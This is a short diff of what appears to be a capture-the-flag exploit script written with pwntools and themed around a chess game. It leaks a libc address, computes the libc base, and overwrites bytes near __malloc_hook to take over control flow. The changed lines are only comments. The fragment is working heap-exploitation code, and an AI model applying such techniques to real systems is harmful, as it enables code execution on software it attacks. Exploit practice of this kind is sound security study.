@@ -118,7 +118,7 @@ libc.address = libc_leak - 0x1ebc10
 log.info("libc leak: %#x" % libc_leak)
 log.success("libc base: %#x" % libc.address)
 
-# See if the libc address will have rooks or queens encoded in it, for later
+# See if libc pointers will have rook characters encoded in them, for later
 # use via pointers that appear near __malloc_hook.
 for i in [2, 3, 4,]:
     if chr(byte_at(libc_leak, i)) in ["R", "r",]:
@@ -162,8 +162,9 @@ for malloc_hook_byte_pos in range(8):
     pointer_offset = 0x80 + malloc_hook_byte_pos*8
     for byte_pos in range(8):
         if byte_pos != piece_byte_pos:
-            # Clear values of all other bytes in the pointers that contain a
-            # queen or rook byte, so they don't get in the way of our moves.
+            # Clear values of all other bytes in the pointers that don't
+            # contain a rook byte, so they don't get in the way of our moving
+            # "rooks".
             smite_rel_malloc_hook(pointer_offset + byte_pos)
 
     # Move the "rook" over one of __malloc_hook's bytes so that we can smite
